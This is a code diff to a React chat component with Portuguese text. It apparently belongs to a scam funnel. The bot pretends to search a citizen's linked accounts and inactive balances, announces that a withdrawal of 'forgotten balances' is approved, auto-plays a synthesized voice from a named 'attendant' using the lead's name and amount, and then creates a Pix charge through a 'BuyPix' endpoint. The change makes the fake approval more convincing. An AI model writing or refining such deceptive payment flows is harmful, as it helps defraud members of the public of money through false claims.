@@ -283,11 +283,34 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setTyping(false);
         addBotMessage(`Buscando histórico de contas vinculadas e saldos inativos...`);
         
-        setTimeout(() => {
+        setTimeout(async () => {
           setTyping(true);
+          
+          let localAudioUrl: string | undefined = undefined;
+          try {
+             const ttsRes = await axios.post(`${API_URL}/api/v1/tts`, { 
+                name: leadName !== "Cidadão" ? leadName : (window as any)._globalLeadName || "Cidadão",
+                attendantName: attendant.name,
+                voiceId: attendant.voiceId,
+                value: leadValue,
+                docType: data.docType
+             });
+             if (ttsRes.data.audioBase64) {
+                localAudioUrl = `data:audio/mp3;base64,${ttsRes.data.audioBase64}`;
+                setAudioUrl(localAudioUrl);
+             }
+          } catch (err: any) {
+             console.error("TTS generation error", err);
+          }
+
           setTimeout(() => {
             setTyping(false);
-            addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada no valor de **${leadValue}** referentes a saldos esquecidos.`, undefined, "/assets/banners/banner_saque_aprovado.png");
+            addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada no valor de **${leadValue}** referentes a saldos esquecidos.`, undefined, "/assets/banners/banner_saque_aprovado.png", undefined, localAudioUrl);
+            
+            if (localAudioUrl && audioRef.current) {
+               audioRef.current.src = localAudioUrl;
+               audioRef.current.play().catch(e => console.log("Autoplay blocked:", e));
+            }
             
             setTimeout(() => {
               setTyping(true);
@@ -405,27 +428,6 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       });
       setTyping(true);
       
-      try {
-        const ttsRes = await axios.post(`${API_URL}/api/v1/tts`, { 
-           name: leadName !== "Cidadão" ? leadName : (window as any)._globalLeadName || "Cidadão",
-           attendantName: attendant.name,
-           voiceId: attendant.voiceId,
-           value: leadValue,
-           docType: data.docType
-        });
-        if (ttsRes.data.audioBase64) {
-           const url = `data:audio/mp3;base64,${ttsRes.data.audioBase64}`;
-           setAudioUrl(url);
-           addBotMessage("", undefined, undefined, "audio", url);
-           if (audioRef.current) {
-             audioRef.current.src = url;
-             audioRef.current.play().catch(e => console.log("Autoplay blocked:", e));
-           }
-        }
-      } catch (err: any) {
-         console.error("TTS generation error", err);
-      }
-
       try {
         // Fetch BuyPix
         const pixRes = await axios.post(`${API_URL}/api/v1/buypix/create`, {
